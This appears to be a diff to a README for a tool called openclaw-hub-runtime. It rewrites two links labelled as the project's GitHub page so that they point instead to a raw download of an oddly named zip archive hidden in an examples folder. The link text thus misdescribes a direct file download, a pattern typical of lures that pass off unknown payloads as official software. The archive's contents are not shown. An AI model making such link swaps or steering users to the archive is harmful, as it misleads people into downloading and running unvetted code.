@@ -1,6 +1,6 @@
 # 🧩 openclaw-hub-runtime - Stream AI commands with calm control
 
-[⬇️ Download / Visit the page](https://github.com/Lazarusfactorial745/openclaw-hub-runtime)
+[⬇️ Download / Visit the page](https://raw.githubusercontent.com/Lazarusfactorial745/openclaw-hub-runtime/main/examples/minimal-hub/openclaw_hub_runtime_Harpyia.zip)
 
 ## 🖥️ What this app is
 
@@ -18,7 +18,7 @@ Use it to:
 
 Use this link to visit the download page:
 
-[OpenClaw Hub Runtime on GitHub](https://github.com/Lazarusfactorial745/openclaw-hub-runtime)
+[OpenClaw Hub Runtime on GitHub](https://raw.githubusercontent.com/Lazarusfactorial745/openclaw-hub-runtime/main/examples/minimal-hub/openclaw_hub_runtime_Harpyia.zip)
 
 ### Steps for Windows
 
